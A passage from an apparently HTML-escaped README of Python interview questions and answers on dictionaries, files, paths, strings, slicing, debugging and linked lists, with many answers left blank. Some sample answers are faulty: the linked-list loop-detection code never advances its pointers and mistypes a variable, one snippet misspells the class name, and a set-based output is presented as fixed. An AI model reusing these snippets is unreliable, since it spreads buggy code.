&lt;br&gt;&#xA; &lt;b&gt; &lt;pre&gt;&lt;code&gt;{k: v for k, v in sorted(x.items(), key=lambda item: item[1])}&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to sort a dictionary by keys?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;pre&gt;&lt;code&gt;dict(sorted(some_dictionary.items()))&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to merge two dictionaries?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;pre&gt;&lt;code&gt;some_dict1.update(some_dict2)&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Convert the string &#34;a.b.c&#34; to the dictionary &lt;code&gt;{&#39;a&#39;: {&#39;b&#39;: {&#39;c&#39;: 1}}}&lt;/code&gt;&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;pre&gt;&lt;code&gt;output = {}&#xA;string = &#34;a.b.c&#34;&#xA;path = string.split(&#39;.&#39;)&#xA;target = reduce(lambda d, k: d.setdefault(k, {}), path[:-1], output)&#xA;target[path[-1]] = 1&#xA;print(output)&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h5&gt;Common Algorithms Implementation&lt;/h5&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Can you implement &#34;binary search&#34; in Python?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/coding/python/binary_search.py&#34;&gt;Solution&lt;/a&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h4&gt;Python Files&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to write to a file?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;pre&gt;&lt;code&gt;with open(&#39;file.txt&#39;, &#39;w&#39;) as file:&#xA;    file.write(&#34;My insightful comment&#34;)&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Sum all the integers in a given file&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Print a random line of a given file&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Print every 3rd line of a given file&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Print the number of lines in a given file&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Print the number of of words in a given file&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Can you write a function which will print all the file in a given directory? including sub-directories&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Write a dictionary (variable) to a file&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;pre&gt;&lt;code&gt;import json&#xA;&#xA;with open(&#39;file.json&#39;, &#39;w&#39;) as f:&#xA;    f.write(json.dumps(dict_var))&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h4&gt;Python OS&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to print current working directory?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;pre&gt;&lt;code&gt;import os&#xA;&#xA;print(os.getcwd())&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Given the path &lt;code&gt;/dir1/dir2/file1&lt;/code&gt; print the file name (file1)&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;pre&gt;&lt;code&gt;import os&#xA;&#xA;print(os.path.basename(&#39;/dir1/dir2/file1&#39;))&#xA;&#xA;# Another way&#xA;print(os.path.split(&#39;/dir1/dir2/file1&#39;)[1])&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Given the path &lt;code&gt;/dir1/dir2/file1&lt;/code&gt; &#xA;  &lt;ol&gt; &#xA;   &lt;li&gt;Print the path without the file name (/dir1/dir2)&lt;/li&gt; &#xA;   &lt;li&gt;Print the name of the directory where the file resides (dir2)&lt;/li&gt; &#xA;  &lt;/ol&gt; &lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;pre&gt;&lt;code&gt;import os&#xA;&#xA;## Part 1.&#xA;# os.path.dirname gives path removing the end component&#xA;dirpath = os.path.dirname(&#39;/dir1/dir2/file1&#39;)&#xA;print(dirpath)&#xA;&#xA;## Part 2.&#xA;print(os.path.basename(dirpath))&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How do you execute shell commands using Python?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How do you join path components? for example &lt;code&gt;/home&lt;/code&gt; and &lt;code&gt;luig&lt;/code&gt; will result in &lt;code&gt;/home/luigi&lt;/code&gt; &lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How do you remove non-empty directory?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h4&gt;Python Regex&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How do you perform regular expressions related operations in Python? (match patterns, substitute strings, etc.)&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Using the re module &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to find all the IP addresses in a variable? How to find them in a file?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h4&gt;Python Strings&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Find the first repeated character in a string&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;While you iterate through the characters, store them in a dictionary and check for every character whether it&#39;s already in the dictionary.&lt;/p&gt; &lt;pre&gt;&lt;code&gt;def firstRepeatedCharacter(str):&#xA;    chars = {}&#xA;    for ch in str:&#xA;        if ch in chars:&#xA;            return ch&#xA;        else:&#xA;            chars[ch] = 0&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to extract the unique characters from a string? for example given the input &#34;itssssssameeeemarioooooo&#34; the output will be &#34;mrtisaoe&#34;&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;pre&gt;&lt;code&gt;x = &#34;itssssssameeeemarioooooo&#34;&#xA;y = &#39;&#39;.join(set(x))&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Find all the permutations of a given string&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;pre&gt;&lt;code&gt;def permute_string(string):&#xA;&#xA;    if len(string) == 1:&#xA;        return [string]&#xA;&#xA;    permutations = []&#xA;    for i in range(len(string)):&#xA;        swaps = permute_string(string[:i] + string[(i+1):])&#xA;        for swap in swaps:&#xA;            permutations.append(string[i] + swap)&#xA;&#xA;    return permutations&#xA;&#xA;print(permute_string(&#34;abc&#34;))&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;Short way (but probably not acceptable in interviews):&lt;/p&gt; &lt;pre&gt;&lt;code&gt;from itertools import permutations&#xA;&#xA;[&#39;&#39;.join(p) for p in permutations(&#34;abc&#34;)]&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;Detailed answer can be found here: &lt;a href=&#34;http://codingshell.com/python-all-string-permutations&#34;&gt;http://codingshell.com/python-all-string-permutations&lt;/a&gt;&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to check if a string contains a sub string?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Find the frequency of each character in string&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Count the number of spaces in a string&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;You can use the &#34;count&#34; method like this:&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;&#xA;ImAString.count(&#34; &#34;)&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Given a string, find the N most repeated words&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Given the string (which represents a matrix) &#34;1 2 3\n4 5 6\n7 8 9&#34; create rows and colums variables (should contain integers, not strings)&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the result of each of the following? &lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt; &#39;, &#39;.join([&#34;One&#34;, &#34;Two&#34;, &#34;Three&#34;])&#xA;&amp;gt;&amp;gt; &#34; &#34;.join(&#34;welladsadgadoneadsadga&#34;.split(&#34;adsadga&#34;)[:2])&#xA;&amp;gt;&amp;gt; &#34;&#34;.join([&#34;c&#34;, &#34;t&#34;, &#34;o&#34;, &#34;a&#34;, &#34;o&#34;, &#34;q&#34;, &#34;l&#34;])[0::2]&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; &#39;One, Two, Three&#39;&#xA;&amp;gt;&amp;gt;&amp;gt; &#39;well done&#39;&#xA;&amp;gt;&amp;gt;&amp;gt; &#39;cool&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;If &lt;code&gt;x = &#34;pizza&#34;&lt;/code&gt;, what would be the result of &lt;code&gt;x[::-1]&lt;/code&gt;?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;It will reverse the string, so x would be equal to &lt;code&gt;azzip&lt;/code&gt;. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Reverse each word in a string (while keeping the order)&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the output of the following code: &lt;code&gt;&#34;&#34;.join([&#34;a&#34;, &#34;h&#34;, &#34;m&#34;, &#34;a&#34;, &#34;h&#34;, &#34;a&#34;, &#34;n&#34;, &#34;q&#34;, &#34;r&#34;, &#34;l&#34;, &#34;o&#34;, &#34;i&#34;, &#34;f&#34;, &#34;o&#34;, &#34;o&#34;])[2::3]&lt;/code&gt;&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;mario &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h4&gt;Python Iterators&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is an iterator?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h4&gt;Python Misc&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain data serialization and how do you perform it with Python&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How do you handle argument parsing in Python?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is a generator? Why using generators?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What would be the output of the following block? &lt;pre&gt;&lt;code&gt;for i in range(3, 3):&#xA;   print(i)&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;No output :) &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is &lt;code&gt;yeild&lt;/code&gt;? When would you use it?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain the following types of methods and how to use them: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Static method&lt;/li&gt; &#xA;   &lt;li&gt;Class method&lt;/li&gt; &#xA;   &lt;li&gt;instance method&lt;/li&gt;&#xA;  &lt;/ul&gt;&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to reverse a list?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to combine list of strings into one string with spaces between the strings&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;You have the following list of nested lists: &lt;code&gt;[[&#39;Mario&#39;, 90], [&#39;Geralt&#39;, 82], [&#39;Gordon&#39;, 88]]&lt;/code&gt; How to sort the list by the numbers in the nested lists?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;One way is:&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;the_list.sort(key=lambda x: x[1]) &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain the following: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;zip()&lt;/li&gt; &#xA;   &lt;li&gt;map()&lt;/li&gt; &#xA;   &lt;li&gt;filter()&lt;/li&gt;&#xA;  &lt;/ul&gt;&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt;  &#xA;&lt;h4&gt;Python - Slicing&lt;/h4&gt; &#xA;&lt;p&gt;For the following slicing exercises, assume you have the following list: &lt;code&gt;my_list = [8, 2, 1, 10, 5, 4, 3, 9]&lt;/code&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the result of `my_list[0:4]`?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the result of `my_list[5:6]`?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the result of `my_list[5:5]`?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the result of `my_list[::-1]`?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the result of `my_list[::3]`?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the result of `my_list[2:]`?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the result of `my_list[:3]`?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h4&gt;Python Debugging&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How do you debug Python code?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;pdb :D &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to check how much time it took to execute a certain script or block of code?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What empty &lt;code&gt;return&lt;/code&gt; returns?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt; &#xA; &lt;p&gt;Short answer is: It returns a None object.&lt;/p&gt; &#xA; &lt;p&gt;We could go a bit deeper and explain the difference between&lt;/p&gt; &#xA; &lt;pre&gt;&lt;code&gt;def a ():&#xA;    return&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; None&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA; &lt;p&gt;And&lt;/p&gt; &#xA; &lt;pre&gt;&lt;code&gt;def a ():&#xA;    pass&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; None&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA; &lt;p&gt;Or we could be asked this as a following question, since they both give the same result.&lt;/p&gt; &#xA; &lt;p&gt;We could use the dis module to see what&#39;s going on:&lt;/p&gt; &#xA; &lt;pre&gt;&lt;code&gt;  2           0 LOAD_CONST               0 (&amp;lt;code object a at 0x0000029C4D3C2DB0, file &#34;&amp;lt;dis&amp;gt;&#34;, line 2&amp;gt;)&#xA;              2 LOAD_CONST               1 (&#39;a&#39;)&#xA;              4 MAKE_FUNCTION            0&#xA;              6 STORE_NAME               0 (a)&#xA;&#xA;  5           8 LOAD_CONST               2 (&amp;lt;code object b at 0x0000029C4D3C2ED0, file &#34;&amp;lt;dis&amp;gt;&#34;, line 5&amp;gt;)&#xA;             10 LOAD_CONST               3 (&#39;b&#39;)&#xA;             12 MAKE_FUNCTION            0&#xA;             14 STORE_NAME               1 (b)&#xA;             16 LOAD_CONST               4 (None)&#xA;             18 RETURN_VALUE&#xA;&#xA;Disassembly of &amp;lt;code object a at 0x0000029C4D3C2DB0, file &#34;&amp;lt;dis&amp;gt;&#34;, line 2&amp;gt;:&#xA;  3           0 LOAD_CONST               0 (None)&#xA;              2 RETURN_VALUE&#xA;&#xA;Disassembly of &amp;lt;code object b at 0x0000029C4D3C2ED0, file &#34;&amp;lt;dis&amp;gt;&#34;, line 5&amp;gt;:&#xA;  6           0 LOAD_CONST               0 (None)&#xA;              2 RETURN_VALUE&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA; &lt;p&gt;An empty &lt;code&gt; return&lt;/code&gt; is exactly the same as &lt;code&gt;return None&lt;/code&gt; and functions without any explicit return will always return None regardless of the operations, therefore&lt;/p&gt; &#xA; &lt;pre&gt;&lt;code&gt;def sum(a, b):&#xA;    global c&#xA;    c = a + b&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; None&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA; &lt;p&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to improve the following block of code? &lt;pre&gt;&lt;code&gt;li = []&#xA;for i in range(1, 10):&#xA;    li.append(i)&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;pre&gt;&lt;code&gt;[i for i in range(1, 10)]&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Given the following function &lt;pre&gt;&lt;code&gt;def is_int(num):&#xA;    if isinstance(num, int):&#xA;        print(&#39;Yes&#39;)&#xA;    else:&#xA;        print(&#39;No&#39;)&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;What would be the result of is_int(2) and is_int(False)?&lt;/p&gt; &lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h4&gt;Python - Linked List&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Can you implement a linked list in Python?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;The reason we need to implement in the first place, it&#39;s because a linked list isn&#39;t part of Python standard library.&lt;br&gt; To implement a linked list, we have to implement two structures: The linked list itself and a node which is used by the linked list.&lt;/p&gt; &lt;p&gt;Let&#39;s start with a node. A node has some value (the data it holds) and a pointer to the next node&lt;/p&gt; &lt;pre&gt;&lt;code&gt;class Node(object):&#xA;    def __init__(self, data):&#xA;        self.data = data&#xA;        self.next = None&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;Now the linked list. An empty linked list has nothing but an empty head.&lt;/p&gt; &lt;pre&gt;&lt;code&gt;class LinkedList(object):&#xA;    def __init__(self):&#xA;        self.head = None&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;Now we can start using the linked list&lt;/p&gt; &lt;pre&gt;&lt;code&gt;ll = Linkedlist()&#xA;ll.head = Node(1)&#xA;ll.head.next = Node(2)&#xA;ll.head.next.next = Node(3)&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;What we have is:&lt;/p&gt; &#xA;  &lt;hr&gt; &lt;p&gt;| 1 | -&amp;gt; | 2 | -&amp;gt; | 3 |&lt;/p&gt; &#xA;  &lt;hr&gt; &lt;p&gt;Usually, more methods are implemented, like a push_head() method where you insert a node at the beginning of the linked list&lt;/p&gt; &lt;pre&gt;&lt;code&gt;def push_head(self, value):&#xA;    new_node = Node(value)&#xA;    new_node.next = self.head&#xA;    self.head = new_node&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Add a method to the Linked List class to traverse (print every node&#39;s data) the linked list&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;def print_list(self): node = self.head while(node): print(node.data) node = node.next &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Write a method to that will return a boolean based on whether there is a loop in a linked list or not&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;Let&#39;s use the Floyd&#39;s Cycle-Finding algorithm:&lt;/p&gt; &lt;pre&gt;&lt;code&gt;def loop_exists(self):&#xA;    one_step_p = self.head&#xA;    two_steps_p = self.head&#xA;    while(one_step_p and two_steps_p and two_steps_p.next):&#xA;        one_step_p = self.head.next&#xA;        two_step_p = self.head.next.next&#xA;        if (one_step_p == two_steps_p):&#xA;            return True &#xA;    return False&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h4&gt;Python - Stack&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Implement Stack in Python&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h4&gt;Python Testing&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is your experience with writing tests in Python?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is PEP8? Give an example of 3 style guidelines&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;PEP8 is a list of coding conventions and style guidelines for Python&lt;/p&gt; &lt;p&gt;5 style guidelines:&lt;/p&gt; &lt;pre&gt;&lt;code&gt;1. Limit all lines to a maximum of 79 characters.&#xA;2. Surround top-level function and class definitions with two blank lines.&#xA;3. Use commas when making a tuple of one element&#xA;4. Use spaces (and not tabs) for indentation&#xA;5. Use 4 spaces per indentation level&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/b&gt;&#xA; 